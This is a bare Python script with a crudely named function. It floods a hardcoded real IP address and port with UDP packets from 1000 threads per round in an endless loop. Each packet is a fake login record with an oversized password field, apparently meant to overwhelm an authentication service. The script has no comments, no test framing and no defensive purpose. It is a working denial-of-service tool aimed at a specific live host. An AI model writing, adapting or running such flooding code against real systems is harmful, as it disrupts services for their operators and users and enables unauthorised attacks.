import socket,threading,time,random
ip_port=("202.114.196.97",21568)
server=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

def fuck_udp(data):
    password="z"*4599
    data='01#'+data+'#'+password+'#'+password+'#'
    server.sendto(data.encode(),ip_port)

pool=[]

while True:
    for x in pool:
        x.start()
        x.join(3)
    time.sleep(1)

    pool.clear()
    for x in range(1000):
        data = 20161000000
        username=str(data)
        t = threading.Thread(target=fuck_udp,args=(username,))
        pool.append(t)
        data=data+1
